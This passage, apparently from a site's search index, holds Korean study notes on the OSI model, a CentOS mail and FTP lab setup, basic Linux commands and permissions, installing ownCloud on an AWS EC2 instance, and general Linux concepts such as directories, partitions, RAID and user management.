개발하기 위한 기술로, 운영체제와 언어 내장 방법, 각종 개발 기법, 프로그래밍 기법을 의미\n  운영 : 네트워크나 서버의 설계부터 도입, 구축, 운영과 관리, 보수에 걸친 이용자의 측면을 의미\n        인터넷의 구성    인터넷과 기업 네트워크는 특정한 통신 기기, 시스템을 사용해 접속한다. 이는 규모와 상관없이 구성이 동일하다.\n  일반적인 인터넷 연결의 구성\n 인터넷 \u0026ndash;\u0026gt; ISP \u0026ndash;\u0026gt; 라우터 \u0026ndash;\u0026gt; 도메인 영역 (허브 -\u0026gt; 서버시스템, 클라이언트) 인터넷과 도메인 영역은 서로 케이블로 연결되어 있음    ISP(Internet Service Provider) : 인터넷 서비스 프로바이더로 인터넷의 상용 서비스를 제공하는 사업자, 일반적으로 프로바이더라고 칭함(LG U+, SKT, KT 등)\n     OSI 참조 모델로 보는 각 계층의 역할      계층 시스템 A 역할 시스템 B     7층 애플리케이션 계층 \u0026lt;\u0026mdash;\u0026ndash; 애플리케이션 \u0026mdash;\u0026ndash;\u0026gt; 애플리케이션 계층   6층 프레젠테이션 계층 \u0026lt;\u0026mdash;\u0026ndash; 포맷, 부호 \u0026mdash;\u0026ndash;\u0026gt; 프레젠테이션 계층   5층 세션 계층 \u0026lt;\u0026mdash;\u0026ndash; 동기, 송신 방법 \u0026mdash;\u0026ndash;\u0026gt; 세션 계층   4층 트랜스포트 계층 \u0026lt;\u0026mdash;\u0026ndash; 논리자 간 데이터 전송 \u0026mdash;\u0026ndash;\u0026gt; 트랜스포트 계층   3층 네트워크 계층 \u0026lt;\u0026mdash;\u0026ndash; 라우팅 \u0026mdash;\u0026ndash;\u0026gt; (게이트웨이 - 중계) \u0026lt;\u0026mdash;\u0026ndash; 라우팅 \u0026mdash;\u0026ndash;\u0026gt; 네트워크 계층   2층 데이터링크 계층 \u0026lt;\u0026mdash;\u0026ndash; 논리 신호 \u0026mdash;\u0026ndash;\u0026gt; (게이트웨이 - 중계) \u0026lt;\u0026mdash;\u0026ndash; 논리 신호 \u0026mdash;\u0026ndash;\u0026gt; 데이터링크 계층   1층 물리계층 \u0026lt;\u0026mdash;\u0026ndash;전기 신호\u0026mdash;\u0026ndash;\u0026gt; (게이트웨이 - 중계) \u0026lt;\u0026mdash;\u0026ndash;전기 신호\u0026mdash;\u0026ndash;\u0026gt; 물리계층     오픈 시스템(개방형)   오픈 시스템(개방형)      애플리케이션 계층은 WWW와 같은 네트워크 애플리케이션의 기능을 담당\n  프레젠테이션 계층은 데이터 상태의부호화 및 포맷, 구조를 담당\n  세션 게층은 데이터 송수신 타이밍과 방법을 규정하여 담당\n  트랜스포트 계층은 송수신 시스템의 프로세스 간 송수신 제어 및 통신을 수행\n  네트워크 계층은 네트워크 상에서 데이터를 라우팅 수행\n  데이터 링크 계층은 디지털 신호의 순서나 포맷의 기능을 규정을 수행\n  물리 계층은 전기신호나 물리 형태 등의 기능을 규정하여 수행\n  네트워크 계층 이하만 포함하는 것이 중계 시스템(게이트 웨이)이고 데이터 링크 계층과 물리 계층에서 규정된 대표적인 것이 이더넷이다.\n      실습을 위한 기본설정   CenOS7  $ yum -y dovecot xinetd sendmail vsftpd httpd ftp $ yum -y update # install $ vi /etc/dovecot/dovecot.conf #protocols = imap pop3 imtp --\u0026gt; protocols = imap pop3 imtp # 주석 제거 $ for i in ftp dovecot xinetd sendmail vsftpd httpd; do systemctl restart $i; done $ for i in ftp dovecot xinetd sendmail vsftpd httpd; do systemctl enable $i; done $ cd /etc/mail $ cp -p -p sendmail.cf sendmail.cf.original $ vi sendmail.cf 139 C{w}localhost.localdomain --\u0026gt; C{w}example.com 264 O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA --\u0026gt; # O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA # 설정변경 $ diff sendmail.cf sendmail.cf.original \u0026lt; C{w}example.com --- \u0026gt; C{w}localhost.localdomain 264c264 \u0026lt; #O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA --- \u0026gt; O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA # 확인 $ systemctl restart sendmail # 재시작 $ vi /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 --\u0026gt; 127.0.0.1 h2g.example.com h2g localhost.localdomain localhost example.com $ cd /etc/vsftpd $ cp -p vsftpd.conf vsftpd.conf.original $ vi cp -p vsftpd.conf anonymous_enable=YES--\u0026gt; anonymous_enable=NO # ftp server 설정 # 기본 설정완료     CentOS 부트 처리    CentOS 부트 처리는 일반적인 유닉스처럼 커널 프로그램(vmlinux)이 마지막에 init 프로세스를 실행해서 프로세스를 제어한다.\n  init 프로세스는 rc.sysinit라는 초기화 처리를 실행한 후, 초기화 테이블(inittab)에서 실행할 스크립트를 식별하는 런레벨을 읽어온다.\n  runlevel은 다음과 같은 시스템 소프트웨어 설정(실행할 프로세스 그룹 분류, 처리)이다.\n  Runlevel\n  halt\n  Single user mode\n  NFS를 사용하지 않는 멀티 유저 모드\n  완전한 멀티 우저 모드\n  사용하지 않음\n  윈도우 시스템(X11)\n  reboot\n    부트할 때 런 레벨에 대응하는 모든 스크립트가 실행되며, 런 레벨 3의 경우 /etc/rc.d/rc3.d 디렉터리 ㅇ나의 모든 스크립트가 실행된다.\n  runlevel 처리는 rc 스크립트로 실행되며 스크립트 내용에 따라서 상주 데몬(서버) 프로세스가 시작된다.\n    시스템 초기화의 처리 순서   로그시작 기본 경로 설정 네트워크 구성 데이터 불러오기 키맵 로드 시스템폰트 로드 메모리 스와핑 설정 호스트 일므 설정 NIS 도메인 이름 설정 루트 파일 시스템 검사 ISA-PNP 설정 루트 파일 시스템 마운트 루트 파일 시스템 사용 상황 사운드 모듈 로드 RAID 시작 파일 시스템 검사 파일 시스템 마운트 사용이 끝난 임시 파일 삭제 시스템 시간 설정 스와핑 시작 시리얼 포트 초기화 SCSI 모듈 로드 X 윈도우 매니저 설정 커널 메시지 로그      커맨드 실습   문자코드 커맨드  $ local LANG=en_US.UTF-8 LC_CTYPE=\u0026#34;en_US.UTF-8\u0026#34; LC_NUMERIC=\u0026#34;en_US.UTF-8\u0026#34; LC_TIME=\u0026#34;en_US.UTF-8\u0026#34; LC_COLLATE=\u0026#34;en_US.UTF-8\u0026#34; LC_MONETARY=\u0026#34;en_US.UTF-8\u0026#34; LC_MESSAGES=\u0026#34;en_US.UTF-8\u0026#34; LC_PAPER=\u0026#34;en_US.UTF-8\u0026#34; LC_NAME=\u0026#34;en_US.UTF-8\u0026#34; LC_ADDRESS=\u0026#34;en_US.UTF-8\u0026#34; LC_TELEPHONE=\u0026#34;en_US.UTF-8\u0026#34; LC_MEASUREMENT=\u0026#34;en_US.UTF-8\u0026#34; LC_IDENTIFICATION=\u0026#34;en_US.UTF-8\u0026#34; LC_ALL= # 문자 코드확인 $ export LANG=ko_KR.eucKR $ local LANG=ko_KR.eucKR LC_CTYPE=\u0026#34;ko_KR.eucKR\u0026#34; LC_NUMERIC=\u0026#34;ko_KR.eucKR\u0026#34; LC_TIME=\u0026#34;ko_KR.eucKR\u0026#34; LC_COLLATE=\u0026#34;ko_KR.eucKR\u0026#34; LC_MONETARY=\u0026#34;ko_KR.eucKR\u0026#34; LC_MESSAGES=\u0026#34;ko_KR.eucKR\u0026#34; LC_PAPER=\u0026#34;ko_KR.eucKR\u0026#34; LC_NAME=\u0026#34;ko_KR.eucKR\u0026#34; LC_ADDRESS=\u0026#34;ko_KR.eucKR\u0026#34; LC_TELEPHONE=\u0026#34;ko_KR.eucKR\u0026#34; LC_MEASUREMENT=\u0026#34;ko_KR.eucKR\u0026#34; LC_IDENTIFICATION=\u0026#34;ko_KR.eucKR\u0026#34; LC_ALL= # 문자코드 변경    기본적인 커맨드     커맨드 설명     pwd 현재 디렉터리 이름을 표시   ls -al 현재 디렉터리 안의 파일 /디렉터리 목록을 표시   mkdir 이름 이름의 폴더를 생성   cd 디렉터리명 디렉터리명의 폴더로 진입   cd ../ 한 단계 상위 디렉터리로 이동   cd ~ 홈 디렉터리로 이동   cat 지정한 이름으로 파일을 생성   more 파일명 파일 내용을 more(한 단계)에 걸쳐서 생성   mv 파일명1 파일명2 이름을 파일명1에서 파일명2로 변경   cp - p 파일명1 파일명2 파일명1을 파일명2로 복사   rm 파일명 지정한 피일을 삭제   rm -r 디렉터리명 디렉터리명의 디렉터리를 삭제   rm -fr 디렉터리명 디렉터리명을 강제로 삭제(파일포함)   logout 작업종료       권한 커맨드  $ touch Hi $ ls -l Hi -rw-r--r--. 1 root root 0 12▒▒ 13 02:06 Hi $ chmod 531 Hi $ ls -l Hi -r-x-wx--x. 1 root root 0 12▒▒ 13 02:06 Hi $ useradd bye $ chown Bye Hi $ ls -l Hi r-x-wx--x. 1 Bye root 0 12▒▒ 13 02:06 Hi $ groupadd Hi $ chgrp Hi Hi $ ls -l Hi -r-x-wx--x. 1 Bye Hi 0 12▒▒ 13 02:06 Hi # 권한변경을 확인    속성 의미     -(d) d는 디렉터리 -는 일반파일을 나타냄   r-x Owner권한으로 r-x(4+1)로 읽기 및 실행권한을 의미   -wx Group권한으로 -wx(2+1)로 쓰기 및 실행권한을 의미   \u0026ndash;x Other권한으로 \u0026ndash;x(1)로 실행권한을 의미        ftp server 접속  $ useradd test1 $ passwd test1 ... ... $ ftp localhost Trying ::1... Connected to localhost (::1). 220 (vsFTPd 3.0.2) Name (localhost:root): test1 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; mkdir Hello 257 \u0026#34;/home/test1/Hello\u0026#34; created ftp\u0026gt; exit $ ls /home/test1 drwxr-xr-x. 2 test1 test1 6 Dec 13 02:38 Hello # 확인     vi 편집기 기본 조작     커맨드 의미     i 현재 커서 위치에 무나 입력   a 현재 커서가 위치한 문자 뒤에 무자입력   o 현재 커서가 위치한 행 뒤에 행을 삽입하고 문자 입력   O 현재 ㅌ커서가 위치한 행 앞에 행을 삽입하고 문자 입력   h/왼쪽커서 왼쪽으로 한 문자 이동   l/오른족커서 오른쪽으로 한 문자 이동   i/아래커서 아래로 한 문자 이동   k/위쪽커서 위로 한 문자 이동   dd 혀내 커서가 위치한 행을 삭제   x 현재 커서가 위치한 문자를 삭제   :wq! 저장하고 종료   :q! 저장하지 않고 종료   :set number 행 번호 표시   :set nonumber 행 번호 표시 취소   :10,20t31 10행부터 20행까지를 31행째 다음에 복사   :network network를 검색      "}),a.add({id:237,href:'/docs/aws/awstraining/owncloud/',title:"AWS OwnCloud",content:"Nas-Owncloud 실습    Owncloud를 활용하여 Ec2 Nas 만들기        EC2 생성\n\u0026gt; OS : Ubuntu 18.04\r\u0026gt; Flavor : t2.micro\r\u0026gt; Storage : 100G ( 원하는 만큼, 차후에 EFS 등으로도 가능합니다. )\r\u0026gt; VPC : Custop\r\u0026gt; 보안그룹 : Custop\r 인스턴스를 생성합니다.      먼저, Owncloud를 사용하기 위해서는 LAMP를 설치해야합니다.  $ sudo apt install -y tasksel $ sudo tasksel install -y lamp-server # LAMP 간편 설치 $ sudo apt install -y apache2 # apache2 설치 $ sudo apt install -y mysql-server # mysql 설치 $ sudo apt install -y php7.2 $ sudo apt install -y libapache2-mod-php7.2 $ sudo apt install -y php-mysql # php 및 연동모듈 설치 $ apache2 -v $ mysql --version $ php -v # 확인 LAMP란?    $ wget -nv https://download.owncloud.org/download/repositories/10.0/Ubuntu_18.04/Release.key -O Release.key $ apt-key add - \u0026lt; Release.key $ echo \u0026#39;deb http://download.owncloud.org/download/repositories/10.0/Ubuntu_18.04/ /\u0026#39; | sudo tee /etc/apt/sources.list.d/owncloud.list # Ubuntu의 기본패키지에는 Owncloud가 지정되어 있지 않음  Owncloud 저장소 지정     $ sudo apt -y update $ sudo apt -y upgrade $ sudo apt -y install php-bz2 php-curl php-gd php-imagick php-intl php-mbstring php-xml php-zip owncloud-files $ ls -l /var/www/owncloud/ # 확인  Owncloud 설치     $ mysql -u root -p $ mysql\u0026gt; CREATE DATABASE [ DB 이름 ]; $ mysql\u0026gt; GRANT ALL ON [ DB이름 ].* to \u0026#39;[ 계정 ]\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;[ PW ]\u0026#39;; $ mysql\u0026gt; FLUSH PRIVILEGES; $ mysql\u0026gt; exit  owncloud DB 및 원격접속 계정생성     $ sudo vi /etc/apache2/apache2.conf \u0026lt;Directory /var/www/owncloud\u0026gt; Options FollowSymlinks AllowOverride All Require all granted \u0026lt;/Directory\u0026gt;  apache2.conf에서 owncloud에 대한 접근 권한을 설정합니다.     $ sudo vi /etc/apache2/sites-available/000-default.conf DocumentRoot /var/www/html \u0026gt; DocumentRoot /var/www/owncloud  apache2의 기본 경로를 수정합니다.     $ sudo mkdir /data $ sudo chmod 0770 /data $ sudo chown www-data:www-data /data # owncloud 사용을 위한 권한 및 소유자 변경  저장의 사용할 폴더를 미리 만들어 둡니다.     $ sudo systemctl restart apache2 $ sudo service apache2 restart  apache2를 재시작합니다.      http://IP를 통해 접속합니다. 알맞은 값을 기입 후 설치를 완료합니다.      설치가 완료되면, 루트계정을 통해 접속합니다.      설치가 완료되었습니다.      Elastci IP 를 주어 고정시킬 수 있고, 방화벽, 보안그룹의 설정을 통해 특정 IP만을 접속하게 할 수 있습니다. 다음은 owncloud를 커스터마이징 해보도록 하겠습니다.     Owncloud 설정   도메인 등록\n$ vi /var/www/owncloud/config/config.php array ( 0 =\u0026gt; \u0026#39;IP\u0026#39; 1 =\u0026gt; \u0026#39;Domain\u0026#39; )  도메인 접근 허용 설정  "}),a.add({id:238,href:'/docs/system/linux/lm-1/',title:"Linux 일반",content:"리눅스 일반   리눅스의 특징 및 장단점   특징   오픈 소스 운영체제이다.\n  멀티유저(다중사용자), 멀티테스킹(다중작업) 운영체제이다.\n  다중스레드를 지원하는 네트워크 운영체제이다.\n  여러 종류의 파일시스템을 지원하는 운영체제이다.\n       장단점   리눅스는 유닉스와 완벽하게 호환 가능하다.\n  리눅스는 PC용 운영체제보다 안정적이다.\n  하드웨어 기능을 효과적으로 사용한다.\n  리눅스는 오픈 소스 운영체제이다.\n  공개 운영체제이기 때문에 문제점 발생 시 기술지원을 받기 어렵다.\n  한글 지원이 미흡하다.\n       리눅스 디렉터리 종류와 특징     디렉터리 저장내용     / 파일 시스템이 있는 최상위 디렉터리로 루트 디렉터리, 모든 디렉터리의 출발점   /boot 부트 디렉터리로 부팅 시 커널 이미지의 부팅 정보 저장 파일   /proc 시스템 정보 디렉터리이며 커널 기능을 제어하는 역할     현재 실행되는 프로세스와 실제로 사용되는 장치, 하드웨어 정보 저장   /lib 공유 라이브러리 디렉터리     커널 모듈 파일들과 프로그램 실행을 지원해 주는 라이브러리 저장   /bin 기본적인 명령어가 저장된 디렉터리     root 사용자와 일반 사용자가 함께 사용할 수 있는 명령의 디렉터리   /dev 시스템 디바이스 파일들을 저장하는 디렉터리, 하드디스크 장치 파일, CD-ROM 장치파일 같은 파일 저장   /etc 시스템 환경 설정 파일 저장 디렉터리   /root 시스템 관리자용 홈 디렉터리   /sbin 관리자용 시스템 표준 명령 및 시스템 관리와 관련된 실행 명령어 저장   /usr 사용자 디렉터리로 사용자 데이터나 애플리케이션 저장   /home 사용자 계정 디렉터리로 계정들의 홈 디렉터리가 위치     일반 사용자들이 로그인 시 처음으로 위치하게 되는 디렉터리   /var 가변 자료 저장 디렉터리로 로그 파일이나 메일 데이터 저장   /tmp 각종 프로그램이나 프로세스 작업을 할 때 임시로 생성되는 파일 저장     모든 사용자에 대해서 읽기와 쓰기가 허용     시티키 비트 설정으로 파일의 소유자만이 자신의 소유 파일을 지울 수 있음   /mnt 파일 시스템을 일시적으로 마운트 할 때 사용   /lost+found 결함이 있는 파일에 대한 정보가 저장되는 디렉터리       리눅스 배포판   종류     종류 설명     슬랙웨어 리눅스 배포판 가운데 가장 먼저 대중화된 배포판으로 1992년 패트릭 볼커딩   에 의해 출시되었다.    데비안 데비안 프로젝트에서 만들어 배포하는 공개 운영체제로 GNU의 공식적인 후원을 받고있는 유일한 배포판이다.   우분투 데비안GNU/리눅스에 기초한 운영체제이다.   레드햇 미국의 레드햇사가 개발하던 리눅스 배포판이다.   RHEL 레드햇이 개발하여 판매하고 있는 상용 리눅스 배포판이다.   페도라 리눅스 커널에 기반한 운영체제와 레드햇의 후원과 개발 공동체의 지원 아래 개발된 배포판이다.   CentOS 업스트림 소스인 레드햇 엔터프라이즈 리눅스와 완벽하게 호환되는 무료 기업용 컴퓨팅 운영체제이다.   수세 독일에서 출시된 배포판으로 유럽에서 인기를 누리고 있다.       리눅스 역사   중요성이 낮음\u0026hellip;     리눅스 라이선스     종류 설명     GNU GNU 는 유닉스가 아니다 (GNU’s Not UNIX) 의 약자이다.   자유 소프트웨어 재단 FSF(Free Software Foundation) 으로 1985년 리처드 스톨만이 설립한 재단이다.   오픈 소스 소프트웨어 Open Source Software 1998 년 일부 커뮤니티에서 ‘자유 소프트웨어’ 대신 ‘오픈 소스 소프트웨어’ 라는 용어를 사용하기 시작했다.   GNU GPL(General Public License) GPL 은 자유 소프트웨어 재단에서 만든 Free 소프트웨어 라이선스다.   GNU LGPL(Lesser General Public License) LGPL 은 GPL 보다는 훨씬 완회된 조건의 공개소프트웨어 라이선스이다. LGPL 이 적용된 라이브러리를 이용하여 개발하였을 경우 프로그램 소스코드는 공개하지 않아도 된다.   BSD(Berkeley Software Distribution) 라이선스 버클리 캘리포니아 대학의 자유소프트웨어저작권의 한 가지이다.   아파치(Apache) 라이선스 아파치 소프트웨어 재단에서 자체적으로 만든 소프트웨어에대한 라이선스 규정이다.   MIT(Massachusetts Institute of Technology) 라이선스 BSD 라이선스를 기초로 작성된BSD 계열 라이선스 중의 하나이다.   MPL(Mozilla Public License) MPL 의 특징은 소스코드와 실행파일의 저작권을 분리했다는 점이다.       기본 설치 및 유형  리눅스 설치의 개요   리눅스 설치 파일은 해당 배포본의 홈페이지에서 다운로드 받을 수 있다.\n  리눅스는 단 하나의 제품 또는 한 종류의 제품군만 있는 것이 아니다.\n  리눅스 배포판마다 설치 환경과 설치 과정이 다르다.\n  리눅스 설치 유형은 배포판마다 다르지만 패키지에 따라 데스크탑형, 서버형, 사용자 정의형으로 구분한다.\n  설치 전에 시스템이 있는 모든 파일을 백업해 둔다.\n  멀티 부팅 시스템을 만든다면, 현재 운영체제의 배포 미디어를 가지고 있어야 한다.\n  부팅 드라이브를 다시 파티션 하는 경우라면, 운영체제의 부트로드를 다시 설채햐아 할수도 있고, 더 많은 경우에 운영체제 전체를 해당 파티션에 다시 설채햐아한다.\n     리눅스 설치를 위한 하드웨어 정보 파악   하드웨어 정보\n  하드웨어 호환성\n  네트워크 설정\n       리눅스 설치하기     단계 설명     1단계 설치 초기화면 – Test this media \u0026amp; install CentOS7, Install CentOS8   2단계 설치 초기화면 – Rescue a CentOS system, Run a memory test   3단계 언어선택   4단계 설치 요약 확인   5단계 날짜와 시간 설정   6단계 설치 소스 – 저장소(repository) 서버 주소 변경   7단계 설치 소스 – 설치와 관련된 특수 저장 장치 설정   8단계 설치 소스 – 기본 저장 장치 하드디스크 파티션 설정   9단계 소프트웨어 선택   10단계 Kdump 설정   11단계 네트워크 설정과 호스트명 지정   12단계 패스워드 지정       파티션   파티션 특징과 종류   파티션이란, 하나의 물리적 디스크를 여러 개의 논리적인 디스크로 분할하는 것이다.\n  파티션은 주 파티션, 확장 파티션, 논리 파티션, 스왑 파티션으로 구분된다.\n      주 파티션 부팅이 가능한 기본 파티션   하나의 하드디스크에 최대 4개의 주 파티션 분할 가능\n  하드디스크를 4개 이상의 파티션으로 사용해야 할 때 하나의 확장 파티션을 설정하여 확장 파티션 안에 여러 개의 논리 파티션을 분할하여 데이터저장\n  확장 파티션 주 파티션 내에 생성, 하나의 물리적 디스크에 1개만 생성\n  파티션 번호는 1~4번이 할당\n  데이터 저장 영역을 위한 것이 아니라 논리 파티션을 생성\n  논리 파티션 확장 파티션 안에 생성되는 파티션\n  논리 파티션은 12개 이상 생성하지 않는 것을 권고하며 5번 이후의 번호가 붙여진다.\n  스왑 파티션 하드디스크의 일부를 메모리처럼 사용하는 영역\n  주 파티션 또는 논리 파티션에 생성\n  프로그램 실행 시 부족한 메모리 용량을 하드디스크로 대신 리눅스 설치\n  시에 반드시 설치되어야 하는 영역\n  스왑 영역의 크기는 메모리의 2배를 설정하도록 권고\n     디스크와 장치명   분할된 파티션은 디스크의 장치 파일명 뒤에 숫자를 붙인다.\n  리눅스에서 파티션 만들고 마운트할 때 지정된 디바이스명을 사용한다.\n       파일 시스템   파일 시스템은 운영체제가 파일을 시스템의 디스크 파티션상에 구성하는 방식이다.\n  일정한 규칙을 가지고 파일을 저장하도록 규칙 방식을 제시한다.\n  파티션에 파일 시스템이 없으면, 파일 시스템 생성을 거쳐야 사용이 가능하다.\n  리눅스는 고유의 파일 시스템뿐만 아니라 다양한 파일 시스템을 지원하고 있다.\n       LVM(Logical Volumn Manager)   여러 개의 하드디스크를 합쳐서 사용하는 기술로 한 개의 파일 시스템을 사용한다.\n  작은 용량의 하드디스크 여러 개를 큰 용량의 하나의 하드디스크처럼 사용한다.\n  서버를 운영하면서 대용량의 별도 저장 공간이 필요할 때 활용된다.\n  다수 개의 디스크를 묶어서 사용함으로써 파티션의 크기를 줄이거나 늘릴 수 있다.\n       RAID   RAID 는 복수 배열 독립 디스크의 약자이다.\n  여러 개의 물리적 디스크를 하나의 논리적 디스크로 인식하여 작동하게 하는 기술이다.\n  여러 개의 하드디스크에 일부 중복된 데이터를 나눠서 저장하는 기술이다.\n  RAID 종류는 하드웨어 RAID 와 소프트웨어 RAID 로 나뉜다.\n  데이터를 저장하는 다양한 방법이 존재하며 이 방법들을 레벨이라 한다.\n  레벨에 따라 저장 장치의 신뢰성을 높이거나 전체적인 성능을 향상시키는 다양한 목적을 만족시킨다.\n  각 레벨의 장점을 합친 RAID 구성으로는 대표적으로 RAID 0+1과 RAID 1+0 이 있다.\n       파티션 분할   fdisk 는 파티션 테이블을 관리하는 명령으로 리눅스의 디스크 파티션을 생성, 수정, 삭제할 수 있는 일종의 유틸리티이다.\n  fdisk 명령어 : a, I, n, t, w, p, q\n       부트 매니저   부트로드   부트스크랩 로더의 준말로 컴퓨터를 사용자가 사용할 수 있도록 디스크나 플래시에 저장된 운영체제를 읽어 주기억장치에 적재해 주는 프로그램이다.\n  부트로더는 운영체제가 시동되기 이전에 미리 실행되면서 커널이 올바르게 시동되기 위해 필요한 모든 관련 작업을 마무리하고 최종적으로 운영체제를 시동시키기 위한 프로그램이다.\n  임베디드 시스템 부트로더란, PC 의 BIOS 와 OS Loader 의 기능을 수행하는 프로그램으로 시스템이 부팅할 때 가장 먼저 수행된다.\n  운영체제 실행에 필요한 환경을 설정하고 운영체제 이미지를 메모리에 복사한다.\n  부트로더는 부트매니저라고도 부르며 크기가 512바이트로 하드디스크의 첫번째 섹터인MBR(Master Boot Record) 에 위치한다.\n  주 파티션마다 부트섹터가 할당된다.\n  분할된 주 파티션들은 자신의 부트 레코드를 MBR에 기록하여 실행된다.\n  한 컴퓨터에 다수개의 운영체제가 설치되어 있는 경우 작업 운영체제를 선택하여 부팅할수 있게 한다.\n       런레벨   리눅스 부팅 시 작동하는 서비스들이 있다. 런레벨에 따라 작동하는 서비스를 조정 가능하다.\n  런레벨은 0 에서 6까지 총 7가지이다.\n  7가지 런레벨 중 리눅스가 가동 시 특정 모드의 레벨을 디폴트로 할 경우 파일 /etc/inittab 에 설정한다.\n  /etc/inittab 파일 형식은 ‘코드 런레벨 | 행동 | 명령어’이다.\n  현재 실행되는 런레벨을 확인하는 명령어는 runlevel 이다.\n      로그인과 로그아웃   로그인   리눅스는 X윈도우상에서의 로그인/로그아웃과 콘솔상에서의 로그인/로그아웃이 있다.\n  로그인 과정 | 입력한 패스워드와 파일 /etc/passwd 필드 비교 -\u0026gt; 셀 설정 파일 실행 -\u0026gt; 로그인 셀 실행\n       로그아웃  로그아웃은 logout, exit 또는 조합키 Ctrl+D 를 사용한다. 관리자는 일정시간 동안 작업을 수행하지 않는 모든 사용자들을 강제로 로그아웃할 수 있다.       사용자 생성 및 계정 관리  리눅스 명령어   which   명령어의 경로를 확인하는 명령어이다.\n  명령어의 위치를 찾아주거나 alias 를 보여주는 명령어이다.\n       alias  자주사용하는 명령어를 특정 문자로 입력해 두고 명령어 대신 해당 문자를 사용할 수 있게 하는 명령어이다.       unalias  alias 기능을 해제한다.       환경변수 PATH   PATH 는 실행 파일들의 디렉터리 위치를 저장해 놓는 환경 변수이다.\n  명령어 echo $PATH 는 지정된 PATH 값을 확인할 수 있다.\n  기존의 PATH 에 새로운 경로를 추가하는 방법에는 명령어 PATH 나 홈 디렉터리의 .bash_profile 에 PATH 를 추가한다. 기존 경로와 새 경로는 | 으로 구분한다.\n       리눅스 도움말  man  리눅스에서 사용하는 명령어들의 매뉴얼을 제공한다.       info  리눅스 명령어의 사용 방법, 옵션 등을 나타낸다.       whatis  명령어에 대한 기능을 간략하게 나타낸다. 완전히 키워드가 일치해야만 해당 명령어의 기능을 확인할 수 있다.       manpath  man 페이지의 위치 경로를 검색하여 표시해 주는 명령어이다.       whereis  찾고자 하는 명령어의 실행 파일 절대 경로와 소스코드, 설정 파일 및 매뉴얼 페이지를 찾아 출력하는 명령이다.       apropos  man 페이지 설명에서 지정한 키워드를 포함하고 있는 명령어이다.       사용자 생성 명령어    useradd   계정을 생성하는 명령어로 명령어 adduser 와 동일한 기능을 갖는다.\n  계정자의 홈 디렉터리는 ‘/home/계정명’ 이다.\n  생성된 계정자 정보는 파일 /etc/passwd, /etc/shadow, /etc/group 에 저장된다.\n       passwd   생성된 계정자의 패스워드를 입력 및 변경하는 명령어이다.\n  생성된 계정자의 패스워드는 /etc/shadow 파일 안에 기록된다.\n       su  su 는 switch user 의 줄임말이다. 현재의 사용자 계정에서 로그아웃하지 않고 다른 사용자 계정으로 로그인하여 해당 사용자의 권한을 획득하는 명령어이다.       사용자 관련 파일   /etc/default/useradd  명령어 useradd 로 사용자 계정을 추가할 때 사용되는 정보를 읽어오는 파일이다.       /etc/passwd  계정자의 정보를 가지고 있는 파일로 리눅스에 로그인할 때 사용된다.       /etc/shadow  계정자의 패스워드 정보가 암호화되어 있는 파일로 암호화 패스워드 및 계정의 유효 기간 등을 기록하고 있는 파일이다.       /etc/login.defs   사용자 계정 설정과 관련된 기본값을 정의한 파일이다.\n  새로운 계정을 생성할 때 반드시 참조하는 파일이다.\n       사용자 계정 관리    usermod   디렉터리 /home 에 위치한 사용자들의 정보를 변경하는 명령어이다.\n  사용자의 홈 디렉터리 변경, 그룹 변경, 유효기간 등을 변경한다.\n       userdel   기존 계정 정보를 삭제하는 명령어이다.\n  사용자의 홈 디렉터리 변경, 그룹 변경, 유효기간 등을 변경한다.\n  옵션 없이 userdel 을 사용하면 /etc/passwd, /etc/shadow, /etc/group 에서 해당 계정자의 정보가 삭제된다.\n       chage  패스워드의 만료 정보를 변경하는 리눅스 명령어이다.       그룹관리    /etc/group   사용자 그룹에 대해 정의되어 있는 파일\n  모든 계정은 한 개 이상의 그룹에 포함되어 있다.\n       /etc/gshadow  그룹의 암호를 MD5 로 하여 저장하며 그룹의 소유주, 구성원 설정이 가능하다.       groupadd  새로운 그룹을 생성하는 명령어이다.       groupdel   기존의 그룹을 삭제하는 명령어이다.\n  그룹 안에 소속되어 있는 계정명이 있을 경우 해당 그룹은 삭제되지 않는다.\n       groupmod  그룹의 설정을 변경하는 명령어이다.       사용자 조회 명령어   users  시스템에 로그인한 사용자 정보를 출력하는 명령어이다.       who   현재 시스템에 접속해 있는 사용자들을 조회하는 명령어이다.\n  사용자 계정명, 터미널정보, 접속시간, 접속한 서버 정보 등을 확인할 수 있다.\n  관리자 root 와 일반 사용자 모드 사용이 가능하다.\n  명령어 ‘who am I’ 또는 ‘whoami’ 는 자신의 정보를 조회할 수 있다.\n       w   현재 접속 중인 사용자들의 정보를 나타내는 명령어이다.\n  확인 가능한 정보는 서버의 현재 시간 정보, 서버 부팅 후 시스템 작동 시간, 서버 접속 자의 총 수, 접속자별 서버 평균 부하율, 접속자별 서버 접속 계정명, TTY명, 로그인 시간정보 등이다.\n  JCPU 는 w TTY 필드의 장치명에서 사용되는 모든 프로세스의 CPU 사용 시간이다.\n  PCPU 는 해당 프로세스 결과값에서 WHAT 필드에 나타나는 프로세스명에서 사용하는 CPU 총시간이다.\n       id  사용자 계정의 uid, gid, group 을 확인하는 명령어이다.       groups  사용자 계정이 속한 그룹 목록을 확인하는 명령어이다.       디렉터리 및 파일  디렉터리 관리 명령어   pwd  현재 작업 중인 디렉터리의 위치를 나타내는 명령어이다.       cd   디렉터리를 이동할 때 사용하는 명령어이다.\n  절대경로는 시작 위치와 상관없이 경로에 모든 디렉터리를 표시하며, 절대 경로의 시작은 / 에서부터 시작한다.\n  상대 경로는 현재 작업 중인 디렉터리를 기준으로 표시하는 경로이다.\n       mkdir  새로운 디렉터리를 생성할 때 사용하는 명령어이다.       rmdir  디렉터리만 삭제하는 명령어로 디렉터리 안에 파일이 존재하는 경우 삭제되지 않는다.       파일 관리 명령어     ls  현재 위치한 디렉터리의 파일 목록들을 나타내는 명령어이다.       cp  파일 또는 디렉터리를 복사하는 명령어이다.       rm  파일 또는 디렉터리를 삭제하는 명령어이다.       mv  파일 또는 디렉터리를 이동하거나 파일명을 변경할 때 사용하는 명령어이다.       touch  파일 크기가 0바이트인 빈 파일을 생성한다. 서버의 현재 시간으로 파일의 최근 사용한 시간과 최근 수정 시간 등 타임스탬프를 변경한다.       file  파일 종류 및 파일 속성값을 나타내는 명령어이다.       find  현재 디렉터리에서부터 하위 디렉터리까지 